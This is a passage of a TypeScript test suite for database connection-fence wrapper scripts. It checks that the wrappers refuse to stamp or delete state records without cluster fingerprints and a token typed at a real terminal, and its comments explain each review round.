      encoding: 'utf8',
      env: { PATH: process.env.PATH ?? '', DEPLOY_ADMIN_DATABASE_URL: 'postgresql://typed:in@127.0.0.1:5432/imsdb' } as unknown as NodeJS.ProcessEnv,
    })
    assert.equal(supplied.status, 0, `${supplied.stdout}${supplied.stderr}`)
    assert.equal(JSON.parse(readFileSync(log, 'utf8')).admin, 'postgresql://typed:in@127.0.0.1:5432/imsdb')
    renameSync(join(dir, 'app', '.env.away'), join(dir, 'app', '.env'))

    // PHASE 3 — THE ARTEFACT MOVED UNDER IT. A wrapper is a file with a digest baked in; if the
    // tree it was written for is not the tree on disk, it refuses rather than handing the
    // credential to whatever is there now.
    rmSync(log)
    writeFileSync(paths.pgEntry, `${readFileSync(paths.pgEntry, 'utf8')}// moved\n`)
    const stale = spawnSync(paths.releaseWrapper, [], { encoding: 'utf8', env: { PATH: process.env.PATH ?? '' } as unknown as NodeJS.ProcessEnv })
    assert.equal(stale.status, 1, 'a wrapper whose artefact moved must refuse')
    assert.ok(!existsSync(log), 'and must not run it')
    assert.match(stale.stderr, /has changed since the fence was raised/, stale.stderr)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})


/**
 * A HELPER THAT ANSWERS `--audit-authority` OUT OF THE SHIPPED MODE (o3d-secops r26).
 *
 * Not a stub of the verdict: it IMPORTS doAuditAuthority() from the repository's own
 * scripts/fence-db-connections.mjs and hands it a client whose one answer is a `datacl` string
 * read from a fixture file the test rewrites between phases. So the record read, the provenance
 * gate, the ACL parse, the three-way rule, the verdict line and the exit status are all the
 * shipped ones, and what the fixture supplies is the database's answer and nothing else.
 *
 * A rig that computed the verdict itself would be asserting that its author can compare two
 * lists, and would go on passing if the rule the wrapper acts on changed underneath it.
 */
function auditingHelper(dir: string, fixtureFile: string): string {
  const shipped = `file://${join(process.cwd(), 'scripts', 'fence-db-connections.mjs')}`
  return [
    "import { appendFileSync, readFileSync, writeFileSync } from 'node:fs'",
    `import { doAuditAuthority } from ${JSON.stringify(shipped)}`,
    `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
    'const arg = (name) => {',
    '  const hit = process.argv.find((a) => a.startsWith(`--${name}=`))',
    '  return hit ? hit.slice(name.length + 3) : \'\'',
    '}',
    "if (process.argv.includes('--audit-authority')) {",
    `  const fixture = JSON.parse(readFileSync(${JSON.stringify(fixtureFile)}, 'utf8'))`,
    // A CONCURRENT WRITER, LANDING IN THE ONE WINDOW THE ROUND IS ABOUT (o3d-secops r28, Codex
    // HIGH 3). The wrapper inspects the record, runs THIS process to audit it, and then stamps or
    // removes it. `rewriteStateTo` makes the audit itself replace the record while the wrapper is
    // between its read and its write — which is exactly what a release running beside a resolution
    // does, and is not something a test can arrange from outside the wrapper at all.
    "  if (fixture.rewriteStateTo !== undefined) {",
    `    writeFileSync(arg('state-file'), fixture.rewriteStateTo)`,
    '  }',
    '  const client = {',
    '    query: async (sql) => {',
    '      const text = String(sql)',
    // The cluster fingerprint's own query, kept its own because a server may refuse it.
    "      if (text.includes('FROM pg_catalog.pg_control_system()')) {",
    '        if (fixture.systemIdentifierError) throw new Error(fixture.systemIdentifierError)',
    "        return { rows: [{ system_identifier: fixture.systemIdentifier ?? '' }] }",
    '      }',
    "      if (text.includes('AS audited_database')) {",
    // EVERY COLUMN THROUGH THE ALIAS TEST, NOT ONLY THE TWO ROLE ONES (o3d-secops r28, Codex
    // MEDIUM). r27 introduced this helper for the role halves and went on fabricating the
    // database, the owner and — the load-bearing one — the ACL whatever the SELECT named. A
    // fixture that answers a SHAPE cannot notice a column being dropped, so removing the ACL from
    // the audit's read would have left every phase below deciding on an ACL this file invented.
    "        const askedFor = (alias, value) => (text.includes('AS ' + alias) ? { [alias]: value } : {})",
    '        return { rows: [{',
    "          ...askedFor('audited_database', 'imsdb'),",
    "          ...askedFor('audited_login_role', 'admin'),",
    "          ...askedFor('audited_effective_role', 'admin'),",
    "          ...askedFor('audited_owner_role', 'owner'),",
    "          ...askedFor('audited_datacl_privileges', fixture.privileges),",
    "          ...askedFor('audited_database_oid', fixture.databaseOid ?? ''),",
    '        }] }',
    '      }',
    "      throw new Error('the audit asked something this fixture does not answer: ' + sql)",
    '    },',
    '  }',
    // AND THE IDENTITY THE WRAPPER PASSES ON ARGV IS PASSED STRAIGHT THROUGH (o3d-secops r27). The
    // gate is only exercised end to end if what reaches it is what the published wrapper baked in.
    '  const decided = await doAuditAuthority(client, {',
    "    stateFile: arg('state-file'),",
    "    stateOwnerUid: Number(arg('state-owner')),",
    "    appRole: arg('app-role') || arg('app-user'),",
    "    appHost: arg('app-host'),",
    "    appPort: arg('app-port'),",
    "    appUser: arg('app-user'),",
    "    appDatabase: arg('app-database'),",
    '  })',
    // A HELPER THAT DECIDED AND THEN DIED ON THE WAY OUT. The verdict is on stdout and the exit
    // status is a failure: two channels that disagree, which is the case the wrapper's `&&` is
    // there for and which a fixture where they always agree cannot exhibit.
    '  process.exit(fixture.crash ? 1 : decided)',
    '}',
    'process.exit(0)',
    '',
  ].join('\n')
}

/**
 * aclexplode()'s rows, written the way a fixture wants to state them (o3d-secops r28).
 *
 * NOT A PARSER, deliberately: the entries are spelt out and expanded. Writing PostgreSQL's printed
 * `datacl::text` here and taking it apart again would put the very defect this round removed back
 * inside the test. What the real escaping does is measured against a real cluster in
 * tests/scripts/db-connection-fence.test.ts.
 */
function auditAclRows(entries: ReadonlyArray<readonly [string, string]>) {
  const named: Record<string, string> = { C: 'CREATE', T: 'TEMPORARY', c: 'CONNECT' }
  return entries.flatMap(([grantee, letters], index) =>
    [...letters].map((letter) => ({
      grantee_oid: grantee === '' ? '0' : String(16384 + index),
      grantee,
      privilege: named[letter] ?? letter,
    })),
  )
}

/**
 * THE ONE-TIME OPERATOR RESOLUTION, END TO END (o3d-secops r26/r27, reworked r28).
 *
 * WHAT IS BEING PROVED, in the order it matters:
 *   1. the automatic re-fence REFUSES over an unstamped record, and says which record and where to
 *      go — it does not silently pick a state, which is what r25 did;
 *   2. the RELEASE wrapper still works over that same record, unchanged, which is the escape hatch
 *      that makes the refusal survivable;
 *   3. a fully-withdrawn ACL is REPORTED and not stamped until the operator says the fence is
 *      theirs AND types a token bound to this record at a terminal (r27, then r28);
 *   4. a MIXED reading changes nothing at all, with or without either argument;
 *   5. it refuses every record that is not the ambiguous one, so it cannot be used as a
 *      general-purpose "make this record say what I want" tool;
 *   6. an audit that reached a SAME-NAMED DATABASE ON ANOTHER HOST resolves nothing;
 *   7. (r28) and neither does one that reached a same-named database on ANOTHER CLUSTER at the
 *      right host — which is the case r27 documented and went on deleting records on.
 *
 * WHAT r28 CHANGED IN THIS TEST, and why the old assertions could not simply stay.
 *
 *   PHASE 4a USED TO ASSERT THAT A SPENT LEGACY RECORD IS CLEARED AUTOMATICALLY. It is not any
 *   more, and that is the HIGH. `absent` on an unfenced BYSTANDER cluster reachable at the same
 *   host, port and database name is the identical reading, and clearing on it destroys the only
 *   account of a fence standing on the real one. The clear is automatic where the record's
 *   fingerprint and the answering cluster's AGREE, and asks the operator where it cannot be shown
 *   — which, for a record published before the fingerprint existed, is always. PHASE 4a now
 *   asserts the refusal and PHASE 4d asserts the automatic clear on a fingerprinted record, so
 *   both arms are measured rather than one being traded for the other.
 *
 *   PHASE 3b USED TO PASS `--this-fence-revoked-them` AND EXPECT A STAMP. The flag now selects the
 *   decision and authorises nothing; what authorises it is a token typed at the wrapper's
 *   controlling terminal, derived from the action, the exact bytes of the record and the cluster
 *   that answered. So PHASE 3b runs the wrapper under a real pty and types it.
 *
 * ROUTE: real processes. The wrappers are the ones db_fence_publish_operator_wrappers() writes,
 * run as an operator would with nothing supplied; the record is published by the shipped validator
 * through the shipped re-fence wrapper and then stripped of the fields an older validator never
 * wrote; the verdict comes from the shipped `--audit-authority` over a fixture that answers the
 * query it was actually asked. The terminal is a real pty, allocated by script(1).
 *
 * MUTATION ROUTE (each made against the shipped file and reverted):
 *   1. put r25's rule back in the validator (`standing = true` where the refusal now is): PHASE 1
 *      stops refusing.
 *   2. drop the `"${rc}" -eq 0 &&` half of the clearing arm in resolve_legacy_fence(): PHASE 4c
 *      clears the record on the word of a run that did not finish.
 *   3. remove the `fence_applied` check from db_fence_legacy_inspect_program(): PHASE 5 stops
 *      refusing.
 *   4. (r27) drop the `[[ "${confirmed_stamp}" -ne 1 ]]` gate from the stamping arm: PHASE 3a
 *      stamps without being asked.
 *   5. (r27) drop the `case` arm's `*)` refusal: PHASE 7 stops refusing.
 *   6. (r27, against scripts/fence-db-connections.mjs) delete the requireBoundDatabaseIdentity()
 *      call from doAuditAuthority(): PHASE 6's `unfenced` arm removes the record.
 *   7. (r27) add a `[[ "${confirmed_stamp}" -eq 1 ]]` stamp in front of the final refusal: PHASE
 *      4b's confirmed run stamps a MIXED reading.
 *   8. (r28, against scripts/fence-db-connections.mjs) make compareClusterIdentity() return
 *      CLUSTER_IDENTITY_PROVEN where it returns UNPROVEN: PHASE 4a stops refusing and clears a
 *      legacy record with no fingerprint automatically — the finding, exactly.
 *   9. (r28) delete the mismatch arm of compareClusterIdentity(): PHASE 8 clears the record of a
 *      fence standing on another cluster.
 *  10. (r28) drop `operator_confirms stamp ...` from the stamping arm: PHASE 3b-i, which types a
 *      WRONG answer, stamps anyway.
 *  11. (r28) pass no digest to the stamp (`node -e "${mark_applied}" -- "${state_file}"`): PHASE 9
 *      stamps a record that was replaced while the audit was running.
 *  12. (r28) delete `take_cutover_lock || return 1` from any of the three wrappers: PHASE 10's
 *      corresponding arm runs instead of refusing.
 */
test('r26/r27/r28: the operator resolution acts only on a reading it can attribute, and only on a confirmation a script cannot give', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ims-r26-resolve-'))
  try {
    const fixtureFile = join(dir, 'audit-fixture.json')
    const state = join(dir, 'state.json')
    const calls = join(dir, 'calls.log')
    const cutoverLock = join(dir, 'cutover.lock')
    // THE THREE READINGS. The record names PUBLIC and imsapp, which is what FENCE_PLAN_STUB plans;
    // the owner keeps its own entry in all three, because a fence never takes the owner's.
    const UNFENCED = auditAclRows([['owner', 'CTc'], ['', 'Tc'], ['imsapp', 'c']])
    const FENCED = auditAclRows([['owner', 'CTc']])
    const MIXED = auditAclRows([['owner', 'CTc'], ['imsapp', 'c']])
    // THE CLUSTER THE FIXTURE SAYS ANSWERED. The default is the one FENCE_PLAN_STUB writes into
    // every record it plans, so a fingerprinted record and this fixture agree unless a phase moves
    // one of them on purpose.
    const fixture = (extra: Record<string, unknown>) =>
      writeFileSync(fixtureFile, `${JSON.stringify({
        privileges: UNFENCED,
        systemIdentifier: FENCE_PLAN_CLUSTER.systemIdentifier,
        databaseOid: FENCE_PLAN_CLUSTER.databaseOid,
        ...extra,
      })}\n`)

    fixture({})
    writeFenceCheckout(dir, auditingHelper(dir, fixtureFile))
    // THE ADMIN URL NAMES THE SERVER THE IDENTITY ARGV NAMES (o3d-secops r27).
    const envFile = join(dir, 'app', '.env')
    const adminUrlNaming = (server: string) =>
      writeFileSync(envFile, `DEPLOY_ADMIN_DATABASE_URL="postgresql://admin:pw@${server}/imsdb"\n`)
    adminUrlNaming('db.internal:6432')
    const paths = protectedPaths(dir)
    const wrapperEnv = { PATH: process.env.PATH ?? '' } as unknown as NodeJS.ProcessEnv
    const run = (wrapper: string, args: string[] = []) => spawnSync(wrapper, args, { encoding: 'utf8', env: wrapperEnv })

    /**
     * THE SAME WRAPPER, RUN AT A REAL TERMINAL (o3d-secops r28, Codex MEDIUM).
     *
     * script(1) allocates a pty and makes it the child's controlling terminal, so `/dev/tty` opens
     * inside the wrapper exactly as it does for an operator — and `typed` is what that operator
     * types. Piping into the wrapper's STDIN cannot substitute for this and is asserted not to:
     * the wrapper reads its answer from the terminal and never from stdin.
     */
    const runOnTty = (wrapper: string, args: string[], typed: string) => {
      const quoted = [wrapper, ...args].map((word) => `'${word.replace(/'/g, `'\\''`)}'`).join(' ')
      const child = spawnSync('script', ['-q', '-e', '-c', quoted, '/dev/null'], {
        encoding: 'utf8',
        input: `${typed}\n`,
        env: wrapperEnv,
      })
      // script(1) merges the streams through the pty and the tty turns \n into \r\n.
      return { status: child.status, output: `${child.stdout ?? ''}${child.stderr ?? ''}`.replace(/\r/g, '') }
    }
    /** The token the wrapper displayed, read back out of what it printed. */
    const tokenFrom = (output: string, action: string) => {
      const match = new RegExp(`Type (${action}-[0-9a-f]{12}) to proceed`).exec(output)
      assert.ok(match, `the wrapper must display the token it wants typed:\n${output}`)
      return match[1]
    }

    const publish = runShell(
      artefactHarness(dir, [
        'db_fence_script_in_use >/dev/null || exit 1',
        `db_fence_publish_operator_wrappers "$(id -un)" ${JSON.stringify(envFile)} ${JSON.stringify(state)} ${JSON.stringify(cutoverLock)} --app-host=db.internal --app-port=6432 --app-user=imsapp --app-database=imsdb || exit 1`,
      ]),
    )
    assert.equal(publish.status, 0, `the wrappers must be published:\n${publish.output}`)
    assert.ok(existsSync(paths.resolveWrapper), `the resolution wrapper must be published too:\n${publish.output}`)
    assert.equal(spawnSync('bash', ['-n', paths.resolveWrapper], { encoding: 'utf8' }).status, 0, 'and must parse')

    // THE RECORDS, MADE THE ONLY HONEST WAY: published by the shipped validator through the
    // shipped wrapper, then stripped of the fields a validator that predates them never wrote.
    const raised = run(paths.refenceWrapper)
    assert.equal(raised.status, 0, `${raised.stdout}${raised.stderr}`)
    const modern = JSON.parse(readFileSync(state, 'utf8'))
    assert.equal(modern.fence_applied, 1, 'precondition: an ordinary re-fence stamps its record applied')
    assert.equal(modern.cluster_system_identifier, FENCE_PLAN_CLUSTER.systemIdentifier,
      'precondition: and records which cluster it was raised against (o3d-secops r28)')
    const withoutStamp = { ...modern }
    delete withoutStamp.fence_applied
    delete withoutStamp.fence_mode
    // A RECORD FROM A VALIDATOR THAT PREDATES THE STAMP PREDATES THE FINGERPRINT TOO. That is what
    // makes every legacy record UNPROVEN by construction and is the whole of r28's HIGH 1.
    const legacyRecord = { ...withoutStamp }
    delete legacyRecord.cluster_system_identifier
    delete legacyRecord.cluster_database_oid
    const LEGACY = `${JSON.stringify(legacyRecord, null, 2)}\n`
    const FINGERPRINTED = `${JSON.stringify(withoutStamp, null, 2)}\n`
    const plantLegacy = () => writeFileSync(state, LEGACY)
    const plantFingerprinted = () => writeFileSync(state, FINGERPRINTED)

    // PHASE 1 — THE AUTOMATIC PATH REFUSES, AND SAYS WHERE TO GO.
    plantLegacy()
    const refused = run(paths.refenceWrapper)
    assert.equal(refused.status, 1, `a re-fence over an unstamped record must refuse:\n${refused.stdout}${refused.stderr}`)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and publish nothing over it')
    assert.match(refused.stderr, /carries no applied stamp at all/, refused.stderr)
    assert.ok(refused.stderr.includes(paths.resolveWrapper),
      `the refusal must name the wrapper that resolves it:\n${refused.stderr}`)
    assert.ok(!/--fence/.test(readFileSync(calls, 'utf8').split('\n').slice(-1)[0] ?? ''),
      `and must never reach the executor:\n${readFileSync(calls, 'utf8')}`)

    // PHASE 2 — AND THE RELEASE STILL WORKS OVER IT, WHICH IS THE ESCAPE HATCH. Nothing in the
    // release path consults the stamp or the fingerprint's absence, so an operator holding a record
    // no automatic path will touch can still take a standing fence down.
    //
    // WHAT r30 CHANGED HERE, AND WHY (Codex HIGH 1). The GRANTs are still automatic -- that is the
    // escape hatch, and restoring privilege is the recoverable direction -- but ROOT NO LONGER
    // REMOVES THE RECORD on the strength of the helper's exit status. r29 measured that a physical
    // copy of a fenced cluster answers a release exactly as the original does, so an exit 0 here
    // cannot show WHICH server was released, and removing the record on it would destroy the only
    // account of a fence possibly still standing on the original. This wrapper is the case that
    // matters: it is run against records EARLIER runs published, so it has nothing to attest with.
    // It therefore offers the removal and asks at the terminal -- and this fixture has none, which
    // is exactly the refusal asserted below. The record surviving is the finding being closed, not
    // a regression: the ordinary in-cutover release still clears its own record automatically,
    // which is what tests/scripts/db-connection-fence.test.ts measures against real clusters.
    writeFileSync(calls, '')
    const released = run(paths.releaseWrapper)
    assert.match(readFileSync(calls, 'utf8'), /^--release /m, 'reaching the helper with the record it names')
    assert.match(released.stderr, /ABOUT TO REMOVE the connection-fence authority/,
      `the release must still run and then OFFER the removal:\n${released.stdout}${released.stderr}`)
    assert.match(released.stderr, /record digest:\s+[0-9a-f]{64}/,
      `bound to the record's exact bytes:\n${released.stderr}`)
    assert.equal(released.status, 1,
      `and with no terminal to confirm at, it must not remove anything:\n${released.stdout}${released.stderr}`)
    assert.match(released.stderr, /no controlling terminal/, released.stderr)
    assert.equal(existsSync(state), true,
      'so the record survives -- it is the only thing a release of the REAL fence could be built from')
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'byte for byte as it was found')

    // PHASE 3a — A FULLY-WITHDRAWN ACL IS REPORTED AND NOT STAMPED (o3d-secops r27, Codex HIGH).
    plantLegacy()
    fixture({ privileges: FENCED })
    const reported = run(paths.resolveWrapper)
    assert.equal(reported.status, 1, `an unconfirmed run must not stamp:\n${reported.stdout}${reported.stderr}`)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and must leave the record byte for byte as it was found')
    assert.match(reported.stderr, /TWO HISTORIES/, `naming both causes:\n${reported.stderr}`)
    assert.match(reported.stderr, /ADMINISTRATOR took CONNECT/, `including the one that is not a fence:\n${reported.stderr}`)
    assert.match(reported.stderr, /PUBLIC, imsapp/, `and printing the evidence itself:\n${reported.stderr}`)
    assert.ok(reported.stderr.includes('--this-fence-revoked-them'),
      `and telling the operator exactly what to re-run:\n${reported.stderr}`)

    // PHASE 3b — AND THE FLAG ALONE IS STILL NOT A CONFIRMATION (o3d-secops r28, Codex MEDIUM).
    // With no terminal there is nobody to confirm to, so the run that used to stamp now refuses —
    // and it refuses in the direction that changes nothing.
    const flagOnly = run(paths.resolveWrapper, ['--this-fence-revoked-them'])
    assert.equal(flagOnly.status, 1, `a flag is not a confirmation:\n${flagOnly.stdout}${flagOnly.stderr}`)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and the record must be exactly as it was found')
    assert.match(flagOnly.stderr, /NOT CONFIRMED/, flagOnly.stderr)
    assert.match(flagOnly.stderr, /no controlling terminal/, `saying what is missing:\n${flagOnly.stderr}`)
    // AND STDIN IS NOT THE TERMINAL. Piping the right shape of answer in is the copy-paste route
    // the finding is about, and it must not work either.
    const piped = spawnSync(paths.resolveWrapper, ['--this-fence-revoked-them'], {
      encoding: 'utf8', env: wrapperEnv, input: 'stamp-000000000000\n',
    })
    assert.equal(piped.status, 1, `stdin is not a controlling terminal:\n${piped.stdout}${piped.stderr}`)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and nothing was changed by it')

    // PHASE 3b-i — AT A TERMINAL, WITH THE WRONG ANSWER. The token is displayed and something else
    // is typed; the record must not move. This is what proves the comparison is load-bearing
    // rather than the terminal merely being present.
    const wrongAnswer = runOnTty(paths.resolveWrapper, ['--this-fence-revoked-them'], 'stamp-deadbeefcafe')
    assert.equal(wrongAnswer.status, 1, `a wrong answer must abort:\n${wrongAnswer.output}`)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and change nothing')
    assert.match(wrongAnswer.output, /NOT CONFIRMED/, wrongAnswer.output)
    const stampToken = tokenFrom(wrongAnswer.output, 'stamp')

    // PHASE 3b-ii — AND WITH THE TOKEN IT DISPLAYED, TYPED BACK, IT STAMPS. This is the fact only a
    // person holds: they know whether they revoked those roles, and the database never will.
    const stamped = runOnTty(paths.resolveWrapper, ['--this-fence-revoked-them'], stampToken)
    assert.equal(stamped.status, 0, `a confirmed standing fence must resolve:\n${stamped.output}`)
    assert.match(stamped.output, /CONFIRMED BY THE OPERATOR/, stamped.output)
    const afterStamp = JSON.parse(readFileSync(state, 'utf8'))
    assert.equal(afterStamp.fence_applied, 1, 'the record now says the fence it describes is standing')
    assert.deepEqual(afterStamp.revoked, modern.revoked, 'and nothing else about it moved')
    assert.match(stamped.output, /is stamped APPLIED/, stamped.output)
    // AND THE AUTOMATIC PATH IS UNBLOCKED, under the rule the evidence earned.
    const afterResolve = run(paths.refenceWrapper)
    assert.equal(afterResolve.status, 0, `${afterResolve.stdout}${afterResolve.stderr}`)
    assert.equal(JSON.parse(readFileSync(state, 'utf8')).fence_mode, 'recovery',
      `a resolved standing fence re-fences under the recovery rule:\n${afterResolve.stderr}`)

    // PHASE 3b-iii — AND THE TOKEN IS BOUND TO THAT RECORD AND NOT TO THE ACTION (o3d-secops r28).
    // The same operator, the same wrapper, the same decision — over a record whose bytes differ —
    // must not accept the token the previous record displayed. Without this the token would be a
    // password, and a password typed once is a flag with extra steps.
    plantLegacy()
    const otherRecord = JSON.parse(LEGACY)
    otherRecord.revoked = ['PUBLIC', 'imsapp', 'metabase']
    writeFileSync(state, `${JSON.stringify(otherRecord, null, 2)}\n`)
    const staleToken = runOnTty(paths.resolveWrapper, ['--this-fence-revoked-them'], stampToken)
    assert.equal(staleToken.status, 1, `a token bound to another record must not confirm this one:\n${staleToken.output}`)
    assert.equal(JSON.parse(readFileSync(state, 'utf8')).fence_applied, undefined, 'and the record must be unstamped still')
    assert.notEqual(tokenFrom(staleToken.output, 'stamp'), stampToken,
      'and the token it asks for must differ, because the record does')

    // PHASE 4a — A SPENT LEGACY RECORD IS NOT CLEARED AUTOMATICALLY (o3d-secops r28, Codex HIGH 1).
    // Every recorded grantee still holds CONNECT, which is what a publication killed before BEGIN
    // leaves — AND is what an unfenced bystander cluster with a database of the same name shows.
    // The record carries no fingerprint, so the two cannot be told apart, and the arm that deletes
    // is the one that must not guess.
    plantLegacy()
    fixture({ privileges: UNFENCED })
    const notCleared = run(paths.resolveWrapper)
    assert.equal(notCleared.status, 1, `an unattributable reading must not delete a record:\n${notCleared.stdout}${notCleared.stderr}`)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and the record must be byte for byte what it was')
    assert.match(notCleared.stderr, /CANNOT BE ATTRIBUTED/, notCleared.stderr)
    assert.match(notCleared.stderr, /no cluster fingerprint/, `naming what is missing:\n${notCleared.stderr}`)
    assert.ok(notCleared.stderr.includes('--no-fence-stands-here'),
      `and telling the operator exactly what to re-run:\n${notCleared.stderr}`)

    // PHASE 4a-i — AND WITH THE ARGUMENT AND THE TOKEN, IT GOES. The operator has looked at the
    // host and vouched that this is the cluster the record was written against; that is the fact
    // the fingerprint would have supplied and does not.
    const clearRefused = runOnTty(paths.resolveWrapper, ['--no-fence-stands-here'], 'clear-000000000000')
    assert.equal(clearRefused.status, 1, `a wrong answer must abort the removal too:\n${clearRefused.output}`)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and the record must survive it')
    const clearToken = tokenFrom(clearRefused.output, 'clear')
    const cleared = runOnTty(paths.resolveWrapper, ['--no-fence-stands-here'], clearToken)
    assert.equal(cleared.status, 0, `a confirmed removal must resolve:\n${cleared.output}`)
    assert.equal(existsSync(state), false, 'by being removed, so the next cutover plans afresh')

    // PHASE 4d — AND WHERE THE CLUSTER IS PROVEN IT IS AUTOMATIC AGAIN. The record carries the
    // fingerprint of the cluster that just answered, so the reading is attributable and clearing
    // costs nothing whichever history produced it. Without this arm the round would have traded
    // one defect for a wrapper that can never finish anything on its own.
    plantFingerprinted()
    const autoCleared = run(paths.resolveWrapper)
    assert.equal(autoCleared.status, 0, `an attributable spent record must clear automatically:\n${autoCleared.stdout}${autoCleared.stderr}`)
    assert.equal(existsSync(state), false, 'and be gone')

    // PHASE 4b — THE MIXED READING CHANGES NOTHING.
    plantLegacy()
    fixture({ privileges: MIXED })
    const undecided = run(paths.resolveWrapper)
    assert.equal(undecided.status, 1, `a mixed reading must refuse:\n${undecided.stdout}${undecided.stderr}`)
    assert.equal(readFileSync(state, 'utf8'), LEGACY, 'and leave the record byte for byte as it was found')
    assert.match(undecided.stderr, /NOT RESOLVED/, undecided.stderr)
    assert.match(undecided.stderr, /A MIXED reading/, `naming what it could not settle:\n${undecided.stderr}`)

    // AND NEITHER ARGUMENT AUTHORISES ANYTHING BY ITSELF (o3d-secops r27, extended r28). Each is
    // consulted on ONE reading, and a mixed ACL is neither of them — so no terminal is even
    // offered and nothing moves.
    for (const flag of ['--this-fence-revoked-them', '--no-fence-stands-here']) {
      const forced = runOnTty(paths.resolveWrapper, [flag], 'anything')
      assert.equal(forced.status, 1, `${flag} must not settle a mixed reading:\n${forced.output}`)
      assert.equal(readFileSync(state, 'utf8'), LEGACY, `${flag}: and must change nothing`)
      assert.match(forced.output, /authorised nothing/, `${flag}: saying so plainly:\n${forced.output}`)
    }

    // PHASE 4c — AND THE TWO CHANNELS MUST AGREE. The audit decided `absent` and then failed on its
    // way out; a status can be produced by a shell that never ran the helper and a line by a helper
    // that could not decide, so neither alone may move a record.
    plantFingerprinted()
    fixture({ privileges: UNFENCED, crash: true })
    const halfAnswered = run(paths.resolveWrapper)
    assert.equal(halfAnswered.status, 1, `a verdict from a run that failed must not be acted on:\n${halfAnswered.stdout}${halfAnswered.stderr}`)
    assert.equal(readFileSync(state, 'utf8'), FINGERPRINTED, 'and the record must be exactly as it was found')
    assert.match(halfAnswered.stderr, /NOT RESOLVED/, halfAnswered.stderr)

    // PHASE 5 — AND IT IS NOT A GENERAL-PURPOSE STAMP.
    fixture({ privileges: FENCED })
    const notAmbiguous: [string, string, RegExp][] = [
      ['already stamped', JSON.stringify({ ...modern, fence_mode: 'initial', fence_applied: 1 }, null, 2), /already stamped applied/],
      ['published, never applied', JSON.stringify({ ...modern, fence_mode: 'initial', fence_applied: 0 }, null, 2), /PUBLISHED, NEVER APPLIED/],
      ['truncated', JSON.stringify({ ...modern, state_complete: undefined }, null, 2), /completeness sentinel/],
      ['not JSON', 'this is not a record', /does not hold valid JSON/],
    ]
    for (const [label, body, says] of notAmbiguous) {
      writeFileSync(state, `${body}\n`)
      const before = readFileSync(state, 'utf8')
      const refusal = run(paths.resolveWrapper)
      assert.equal(refusal.status, 1, `${label}: must refuse:\n${refusal.stdout}${refusal.stderr}`)
      assert.match(refusal.stderr, says, `${label}: naming why:\n${refusal.stderr}`)
      assert.equal(readFileSync(state, 'utf8'), before, `${label}: and changing nothing`)
    }

    // PHASE 6 — A SAME-NAMED DATABASE ON ANOTHER HOST RESOLVES NOTHING (o3d-secops r27, HIGH 1).
    adminUrlNaming('replica.internal:6432')
    for (const [label, privileges] of [['unfenced', UNFENCED], ['fenced', FENCED]] as const) {
      plantLegacy()
      fixture({ privileges })
      const wrongCluster = run(paths.resolveWrapper)
      assert.equal(wrongCluster.status, 1, `${label}: another host must resolve nothing:\n${wrongCluster.stdout}${wrongCluster.stderr}`)
      assert.equal(readFileSync(state, 'utf8'), LEGACY, `${label}: and the authority must be byte for byte what it was`)
      assert.match(wrongCluster.stderr, /NOT AUDITED/, `${label}: the audit itself must refuse:\n${wrongCluster.stderr}`)
      assert.match(wrongCluster.stderr, /replica\.internal/, `${label}: naming the host it reached:\n${wrongCluster.stderr}`)
      assert.ok(!/legacy_fence_verdict=/.test(wrongCluster.stdout),
        `${label}: and no verdict may be printed for the wrapper to act on:\n${wrongCluster.stdout}`)
    }
    adminUrlNaming('db.internal:6432')

    // PHASE 8 — AND A SAME-NAMED DATABASE ON ANOTHER CLUSTER AT THE RIGHT HOST RESOLVES NOTHING
    // EITHER (o3d-secops r28, Codex HIGH 1). THE LOAD-BEARING CASE. Every argv/URL check above
    // passes: the host, the port, the database name and the role are all correct, and the server
    // behind them is a different PostgreSQL cluster — which is what DNS, a proxy or a failover
    // produces and what r27 said it could not detect. The ACL is the UNFENCED one, which is
    // exactly the reading that made r26 and r27 DELETE the record.
    plantFingerprinted()
    for (const [label, privileges] of [['unfenced', UNFENCED], ['fenced', FENCED]] as const) {
      writeFileSync(state, FINGERPRINTED)
      fixture({ privileges, systemIdentifier: '7409999999999999999' })
      const otherCluster = run(paths.resolveWrapper)
      assert.equal(otherCluster.status, 1, `${label}: another cluster must resolve nothing:\n${otherCluster.stdout}${otherCluster.stderr}`)
      assert.equal(readFileSync(state, 'utf8'), FINGERPRINTED, `${label}: and the authority must be byte for byte what it was`)
      assert.match(otherCluster.stderr, /NOT AUDITED/, `${label}: the audit itself must refuse:\n${otherCluster.stderr}`)
      assert.match(otherCluster.stderr, /7409999999999999999/, `${label}: naming the cluster that answered:\n${otherCluster.stderr}`)
      assert.ok(!/legacy_fence_verdict=/.test(otherCluster.stdout),
        `${label}: and no verdict may be printed:\n${otherCluster.stdout}`)
    }
    // AND THE DATABASE OID IS THE OTHER HALF: the same cluster, and a database of the same name
    // that was dropped and recreated. The system identifier cannot see that at all.
    writeFileSync(state, FINGERPRINTED)
    fixture({ privileges: UNFENCED, databaseOid: '29999' })
    const recreated = run(paths.resolveWrapper)
    assert.equal(recreated.status, 1, `a recreated database is not the one the record names:\n${recreated.stdout}${recreated.stderr}`)
    assert.equal(readFileSync(state, 'utf8'), FINGERPRINTED, 'and the record must survive it')
    assert.match(recreated.stderr, /OID/, recreated.stderr)

    // PHASE 9 — A RECORD THAT CHANGED BETWEEN THE AUDIT AND THE ACTION IS NOT ACTED ON
    // (o3d-secops r28, Codex HIGH 3). The audit rewrites the record while it runs, which is what a
    // concurrent release does in that window, and is not something this test could arrange from
    // outside the wrapper. The stamp is held to the digest the inspection reported, so it refuses.
    plantFingerprinted()
    const replacement = `${JSON.stringify({ ...withoutStamp, revoked: ['PUBLIC'] }, null, 2)}\n`
    fixture({ privileges: FENCED, rewriteStateTo: replacement })
    // THE CONFIRMATION IS REACHED FIRST, SO IT HAS TO BE SATISFIED OR THE COMPARE-AND-SWAP IS
    // NEVER EXERCISED AT ALL. Measured: with a wrong answer here, deleting the digest from the
    // stamp changed nothing anywhere in this file — the run aborted at the terminal and the write
